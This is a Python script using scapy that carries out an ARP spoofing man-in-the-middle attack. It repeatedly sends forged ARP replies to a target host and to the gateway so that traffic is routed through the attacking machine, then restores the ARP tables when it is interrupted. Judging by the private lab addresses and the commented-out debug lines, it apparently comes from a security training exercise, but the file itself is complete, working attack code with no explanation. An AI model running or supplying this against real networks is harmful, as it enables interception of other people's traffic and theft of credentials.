#!/usr/bin/env python
import time

import scapy.all as scapy


def get_mac(ip):
    # scapy.arping(ip)
    arp_request = scapy.ARP(pdst=ip)
    # arp_request.show()
    # print(arp_request.summary())
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()
    # print(broadcast.summary())
    arp_request_broadcast = broadcast/arp_request
    # print(arp_request_broadcast.summary())
    # arp_request_broadcast.show()
    # answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # print(answered_list.summary())
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# get_mac("10.0.2.1")

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    # print(packet.show())
    # print(packet.summary())

restore("10.0.2.15", "10.0.2.1")

target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Send two packets " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected Ctrl + C ..... Reseting ARP tables .... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
